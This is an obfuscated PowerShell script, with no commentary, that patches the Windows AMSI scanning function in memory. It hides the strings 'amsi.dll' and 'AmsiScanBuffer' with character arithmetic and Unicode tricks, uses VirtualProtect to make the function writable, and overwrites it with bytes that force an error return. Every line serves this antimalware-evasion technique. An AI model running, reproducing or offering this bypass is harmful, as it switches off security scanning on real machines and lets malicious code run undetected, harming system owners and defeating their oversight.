$U3Cx0Fpr2cJYuOU2Y = @"
using System;
using System.Runtime.InteropServices;
public class U3Cx0Fpr2cJYuOU2Y {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr foOBZp, string _d4Nf7xc1vYXwpYh28A);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr EE7rVC6cfZv, UIntPtr NJDR_n, uint pVnoGVOtj, out uint ce0o);
}
"@

Add-Type $U3Cx0Fpr2cJYuOU2Y

$x_Xwo7 = [U3Cx0Fpr2cJYuOU2Y]::LoadLibrary("$([CHAr](85+12)+[CHar]([Byte]0x6d)+[CHar]([bytE]0x73)+[ChAR](105*45/45)+[Char](46+7-7)+[cHaR](100*5/5)+[chAR]([ByTe]0x6c)+[ChAr]([bYTE]0x6c))")
$BDoIN = [U3Cx0Fpr2cJYuOU2Y]::GetProcAddress($x_Xwo7, "$(('ÀmsìScánB'+'úffér').normalize([ChAr]([BytE]0x46)+[chAr]([byte]0x6f)+[cHaR]([byte]0x72)+[ChaR](64+45)+[CHAr]([bYtE]0x44)) -replace [CHAR]([byTe]0x5c)+[ChaR]([BYTe]0x70)+[cHar](123+88-88)+[Char](77+8-8)+[Char]([BytE]0x6e)+[chAR](95+30))")
$p = 0
[U3Cx0Fpr2cJYuOU2Y]::VirtualProtect($BDoIN, [uint32]5, 0x40, [ref]$p)
$_upBnd2wtYi = "0xB8"
$XHU2UwN1TwRqRlzwCL = "0x57"
$VxbaKj0FU3giyxa5vS = "0x00"
$epA8Kh = "0x07"
$tRYV5ns0z8Hk5lu = "0x80"
$xUOm7OCheja = "0xC3"
$pMXDurMOPZwN1l5tzwF = [Byte[]] ($_upBnd2wtYi,$XHU2UwN1TwRqRlzwCL,$VxbaKj0FU3giyxa5vS,$epA8Kh,+$tRYV5ns0z8Hk5lu,+$xUOm7OCheja)
[System.Runtime.InteropServices.Marshal]::Copy($pMXDurMOPZwN1l5tzwF, 0, $BDoIN, 6)